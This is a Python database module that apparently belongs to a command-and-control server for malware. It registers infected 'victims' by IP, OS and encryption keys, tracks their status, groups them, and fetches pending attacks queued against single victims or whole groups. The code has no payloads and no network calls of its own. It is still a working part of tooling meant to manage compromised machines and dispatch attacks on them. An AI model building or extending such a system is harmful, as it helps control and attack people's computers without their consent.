database.py :

import mysql.connector
from env import *

import argparse
import os
import json
import socket
import select
import threading
import rsa
import base64

from database import *
from network import *
from functions import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from queue import Queue, Empty

# Database
db = mysql.connector.connect(
    host=DBHOST,
    user=DBUSER,
    password=DBPASSWORD,
    database=DB
)
mycursor = db.cursor()


def group_exists(group_name):
    query = "SELECT id FROM groups WHERE name = %s;"
    values = (group_name, )
    mycursor.execute(query, values)
    result = mycursor.fetchall()
    return len(result) > 0

def get_group_id(group_name):
    query = "SELECT id FROM groups WHERE name = %s"
    values = (group_name, )
    mycursor.execute(query, values)
    result = mycursor.fetchall()
    if len(result) < 1:
        return None
    else:
        return result[0][0]
    
def get_group_of(id = None, uid = None):
    if id is not None:
        query = "SELECT groups.name FROM groups INNER JOIN victim_groups ON groups.id = victim_groups.group_id WHERE victim_groups.victim_id = %s"
        values = (id, )
    elif uid is not None:
        query = "SELECT groups.name FROM groups INNER JOIN victim_groups ON groups.id = victim_groups.group_id WHERE victim_groups.victim_id = (SELECT id FROM victims WHERE uid = %s)"
        values = (uid, )
    else:
        return None

    mycursor.execute(query, values)
    result = mycursor.fetchall()
    groups = []

    for group in result:
        groups.append(group[0])

    if len(result) < 1:
        return None
    else:
        return groups
    


def get_group_attacks(mycursor):
    # state = "pending", "running", "finished", "error"
    query = "SELECT * FROM group_attacks WHERE state = 'pending';"

    mycursor.execute(query)
    attacks = mycursor.fetchall()

    return attacks


def get_victim_attacks(mycursor):
    # state = "pending", "running", "finished", "error"
    query = "SELECT * FROM victim_attacks WHERE state = 'pending';"

    mycursor.execute(query)
    attacks = mycursor.fetchall()

    return attacks


def add_victim_to_db(db, mycursor, uid, os, ip, sym_key, pub_key):
    # Vérification de l'uid dans la base de données
    query = "SELECT * FROM victims WHERE uid = %s"
    values = (uid,)

    mycursor.execute(query, values)

    myresult = mycursor.fetchall()

    #Update du client en bdd
    if len(myresult) > 0:
        print("\t(+) client updated in database")
        query = "UPDATE victims SET ip = %s, os = %s, status = %s, sym_key = %s, pub_key = %s WHERE uid = %s"
        values = (ip, os, 1, base64.b64encode(sym_key).decode(), base64.b64encode(pub_key.encode()).decode(), uid)

        mycursor.execute(query, values)

    #Insert du client en bdd
    else:
        print("\t(+) client added in database")
        query = "INSERT INTO victims (uid, ip, os, status, sym_key, pub_key, stealth, multi_thread) VALUES (%s, %s, %s, %s, %s, %s, %s, %s)"
        values = (uid, ip, os, 1, base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)

        mycursor.execute(query, values)

    db.commit()

    
def update_status(db, mycursor, uid):

    #Update du client en bdd
    print("\t(+) client updated in database")
    query = "UPDATE victims SET status = %s WHERE uid = %s"
    values = (0, uid)

    mycursor.execute(query, values)

    db.commit() 